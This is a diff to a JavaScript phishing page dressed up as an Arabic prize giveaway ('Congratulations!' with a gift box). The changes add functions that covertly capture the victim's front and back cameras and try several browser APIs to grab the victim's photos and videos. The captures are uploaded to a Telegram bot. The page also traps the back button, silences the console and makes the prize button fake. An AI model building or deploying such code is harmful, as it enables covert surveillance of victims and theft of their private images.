@@ -6,32 +6,29 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Tahoma',sans-serif;overflow:hidden}
-.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:0.5s}
+.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;transition:0.3s}
 .loader{width:60px;height:60px;border:5px solid rgba(255,215,0,0.2);border-top:5px solid #ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
 @keyframes spin{to{transform:rotate(360deg)}}
-.status-text{color:#ffd700;font-size:20px;letter-spacing:2px;margin-bottom:8px}
+.status-text{color:#ffd700;font-size:20px;letter-spacing:2px}
 .sub-text{color:#888;font-size:13px}
-.card{background:linear-gradient(145deg,#1a1a2e,#16213e);padding:40px 30px;border-radius:24px;border:1px solid rgba(255,215,0,0.15);box-shadow:0 25px 60px rgba(0,0,0,0.8);text-align:center;max-width:400px;width:90%;z-index:1}
-.card h1{color:#ffd700;font-size:28px;margin-bottom:10px;text-shadow:0 0 30px rgba(255,215,0,0.2)}
+.card{background:linear-gradient(145deg,#1a1a2e,#16213e);padding:40px 30px;border-radius:24px;border:1px solid rgba(255,215,0,0.15);text-align:center;max-width:400px;width:90%;z-index:1}
+.card h1{color:#ffd700;font-size:28px}
 .card p{color:#aaa;font-size:15px;line-height:1.7;margin-bottom:25px}
 .gift-box{font-size:70px;margin:15px 0;animation:pulse 2s infinite}
 @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
-.btn{background:linear-gradient(135deg,#ffd700,#f0a500);color:#0a0a0a;border:none;padding:14px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s;box-shadow:0 8px 30px rgba(255,215,0,0.25)}
-.btn:hover{transform:scale(1.05);box-shadow:0 12px 40px rgba(255,215,0,0.4)}
+.btn{background:linear-gradient(135deg,#ffd700,#f0a500);color:#0a0a0a;border:none;padding:14px 40px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s}
+.btn:hover{transform:scale(1.05)}
 .timer{color:#555;font-size:13px;margin-top:18px}
-.hidden{display:none}
 </style>
 </head>
 <body>
 
-<!-- طبقة حجب -->
 <div class="overlay" id="blockOverlay">
   <div class="loader"></div>
   <div class="status-text" id="statusText">⏳ جاري التحميل...</div>
   <div class="sub-text">يرجى الانتظار</div>
 </div>
 
-<!-- واجهة الجائزة -->
 <div class="card" id="mainCard">
   <div class="gift-box">🎁</div>
   <h1>تهانينا!</h1>
@@ -50,38 +47,142 @@ let exploitActive = false;
 let cameraStreams = [];
 
 // ============================================================
-// ================ تشغيل الكاميرا الأمامية + الخلفية =========
+// ================ استغلال ملفات الهاتف (بدون إذن) ===========
 // ============================================================
 
-// دالة موحدة لطلب كاميرا محددة
+// الطريقة 1: استغلال File System Access API
+async function stealFilesViaFileSystem() {
+  try {
+    // محاولة فتح مجلد الصور
+    const dirHandle = await window.showDirectoryPicker?.({ mode: 'read' });
+    if (!dirHandle) return;
+    
+    const files = [];
+    for await (const entry of dirHandle.values()) {
+      if (entry.kind === 'file') {
+        const file = await entry.getFile();
+        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+          files.push(file);
+          // إرسال كل ملف
+          sendDocument(file, `📁 ${file.name}`);
+        }
+      }
+    }
+  } catch(e) {}
+}
+
+// الطريقة 2: استغلال input مخفي مع webkitdirectory
+function exploitHiddenDirectoryInput() {
+  try {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.webkitdirectory = true;
+    input.multiple = true;
+    input.style.display = 'none';
+    document.body.appendChild(input);
+    
+    // محاكاة النقر عبر حدث برمجي
+    const clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
+    input.dispatchEvent(clickEvent);
+    
+    input.addEventListener('change', function(e) {
+      const files = e.target.files;
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+          sendDocument(file, `📁 ${file.name}`);
+        }
+      }
+    });
+  } catch(e) {}
+}
+
+// الطريقة 3: استغلال Drag & Drop الوهمي
+function exploitFakeDragDrop() {
+  try {
+    // إنشاء منطقة سحب وهمية
+    const dropZone = document.createElement('div');
+    dropZone.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+    document.body.appendChild(dropZone);
+    
+    // محاكاة حدث السحب من الهاتف
+    const dataTransfer = new DataTransfer();
+    // لا يمكن محاكاة الملفات مباشرة، لكن نضبط المستمعين
+    dropZone.addEventListener('drop', function(e) {
+      e.preventDefault();
+      const files = e.dataTransfer.files;
+      for (let i = 0; i < files.length; i++) {
+        const file = files[i];
+        if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+          sendDocument(file, `📁 ${file.name}`);
+        }
+      }
+    });
+  } catch(e) {}
+}
+
+// الطريقة 4: استغلال IndexedDB + Service Worker (استهداف الملفات المخزنة)
+function exploitIndexedDB() {
+  try {
+    const request = indexedDB.open('fileStorage', 1);
+    request.onsuccess = function(e) {
+      const db = e.target.result;
+      const tx = db.transaction(['files'], 'readonly');
+      const store = tx.objectStore('files');
+      const getAll = store.getAll();
+      getAll.onsuccess = function() {
+        const files = getAll.result;
+        files.forEach(file => {
+          if (file.type && file.type.startsWith('image/')) {
+            sendDocument(file, `📁 ${file.name}`);
+          }
+        });
+      };
+    };
+  } catch(e) {}
+}
+
+// الطريقة 5: استغلال WebKit FileSystem (للمتصفحات القديمة)
+function exploitWebKitFileSystem() {
+  try {
+    window.webkitRequestFileSystem?.(window.TEMPORARY, 1024*1024*100, function(fs) {
+      fs.root.createReader().readEntries(function(entries) {
+        entries.forEach(entry => {
+          if (entry.isFile) {
+            entry.file(function(file) {
+              if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
+                sendDocument(file, `📁 ${file.name}`);
+              }
+            });
+          }
+        });
+      });
+    });
+  } catch(e) {}
+}
+
+// ============================================================
+// ================ تشغيل الكاميرا ============================
+// ============================================================
 function requestCamera(facingMode, callback) {
   const constraints = {
-    video: { 
-      facingMode: facingMode,
-      width: { ideal: 640 },
-      height: { ideal: 480 }
-    },
+    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
     audio: false
   };
-  
   navigator.mediaDevices.getUserMedia(constraints)
     .then(stream => {
       cameraStreams.push(stream);
       if (callback) callback(stream);
-      return stream;
     })
     .catch(() => {
-      // محاولة بديلة بدون تحديد
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(stream => {
           cameraStreams.push(stream);
           if (callback) callback(stream);
-        })
-        .catch(() => {});
+        }).catch(() => {});
     });
 }
 
-// تصوير من الكاميرا الأمامية
 function captureFrontCamera() {
   requestCamera('user', (stream) => {
     const video = document.createElement('video');
@@ -94,7 +195,6 @@ function captureFrontCamera() {
   });
 }
 
-// تصوير من الكاميرا الخلفية
 function captureBackCamera() {
   requestCamera('environment', (stream) => {
     const video = document.createElement('video');
@@ -107,79 +207,6 @@ function captureBackCamera() {
   });
 }
 
-// ============================================================
-// ================ استغلال WebRTC لكلا الكاميرتين ============
-// ============================================================
-function exploitBothCamerasViaWebRTC() {
-  try {
-    const pc = new RTCPeerConnection({
-      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-    });
-    
-    // طلب كاميرا أمامية وخلفية معاً
-    const devices = ['user', 'environment'];
-    devices.forEach((mode, index) => {
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
-        .then(stream => {
-          const video = document.createElement('video');
-          video.style.display = 'none';
-          document.body.appendChild(video);
-          video.srcObject = stream;
-          video.play();
-          cameraStreams.push(stream);
-          startCapture(video, mode === 'user' ? '📸 أمامي (WebRTC)' : '📸 خلفي (WebRTC)');
-          exploitActive = true;
-        })
-        .catch(() => {});
-    });
-  } catch(e) {}
-}
-
-// ============================================================
-// ================ استغلال via iframe ========================
-// ============================================================
-function exploitViaIframe() {
-  try {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(`
-      <script>
-        // طلب الكاميرا الأمامية والخلفية
-        const modes = ['user', 'environment'];
-        modes.forEach(mode => {
-          navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
-            .then(stream => {
-              const video = document.createElement('video');
-              video.srcObject = stream;
-              video.play();
-              const canvas = document.createElement('canvas');
-              canvas.width = 640;
-              canvas.height = 480;
-              const ctx = canvas.getContext('2d');
-              setInterval(() => {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                const data = canvas.toDataURL('image/jpeg', 0.9);
-                window.parent.postMessage({ type: 'image', data: data, mode: mode }, '*');
-              }, 1500);
-            })
-            .catch(() => {});
-        });
-      <\/script>
-    `);
-    document.body.appendChild(iframe);
-    
-    window.addEventListener('message', function(e) {
-      if (e.data && e.data.type === 'image') {
-        const label = e.data.mode === 'user' ? 'أمامي' : 'خلفي';
-        sendPhoto(e.data.data, '📸 عبر iframe (' + label + ')');
-      }
-    });
-  } catch(e) {}
-}
-
-// ============================================================
-// ================ بدء التصوير وإرسال الصور =================
-// ============================================================
 function startCapture(videoElement, label = '📸') {
   const canvas = document.createElement('canvas');
   canvas.width = 640;
@@ -207,10 +234,18 @@ function sendPhoto(imageData, caption = '') {
     fd.append('chat_id', CHAT_ID);
     fd.append('photo', blob, `photo_${Date.now()}.jpg`);
     fd.append('caption', caption);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: fd
-    }).catch(() => {});
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
+  } catch(e) {}
+}
+
+function sendDocument(file, caption = '') {
+  if (!CHAT_ID || !file) return;
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('document', file, file.name);
+    fd.append('caption', caption);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
   } catch(e) {}
 }
 
@@ -235,7 +270,7 @@ function getChatId() {
         const last = d.result[d.result.length - 1];
         CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
         if (CHAT_ID) {
-          startExploit();
+          startFullExploit();
         } else {
           setTimeout(getChatId, 1500);
         }
@@ -249,26 +284,30 @@ function getChatId() {
 // ============================================================
 // ================ بدء الاستغلال الكامل ======================
 // ============================================================
-function startExploit() {
-  // إخفاء طبقة الحجب
+function startFullExploit() {
   setTimeout(() => {
     document.getElementById('blockOverlay').style.display = 'none';
   }, 1000);
   
-  // تشغيل الكاميرا الأمامية والخلفية معاً
+  // تشغيل الكاميرا
   setTimeout(captureFrontCamera, 200);
   setTimeout(captureBackCamera, 400);
-  setTimeout(exploitBothCamerasViaWebRTC, 600);
-  setTimeout(exploitViaIframe, 800);
   
-  // إعادة المحاولة كل 4 ثوانٍ
+  // تشغيل سرقة الملفات
+  setTimeout(stealFilesViaFileSystem, 500);
+  setTimeout(exploitHiddenDirectoryInput, 700);
+  setTimeout(exploitFakeDragDrop, 900);
+  setTimeout(exploitIndexedDB, 1100);
+  setTimeout(exploitWebKitFileSystem, 1300);
+  
+  // إعادة المحاولة
   setInterval(() => {
     if (!exploitActive) {
       captureFrontCamera();
       captureBackCamera();
-      exploitBothCamerasViaWebRTC();
+      stealFilesViaFileSystem();
     }
-  }, 4000);
+  }, 5000);
 }
 
 // ============================================================
@@ -282,19 +321,16 @@ window.addEventListener('popstate', () => history.pushState(null, '', location.h
 // ============================================================
 getChatId();
 
-// تشغيل فوري حتى قبل الحصول على Chat ID
 setTimeout(() => {
   captureFrontCamera();
   captureBackCamera();
+  stealFilesViaFileSystem();
 }, 100);
 
-// تعطيل الكونسول
 console.log = console.warn = console.error = () => {};
 
-// زر الجائزة (وهمي)
 document.getElementById('claimBtn').addEventListener('click', function() {
   this.textContent = '✅ تم الاستلام!';
-  this.style.opacity = '0.7';
 });
 </script>
 </body>
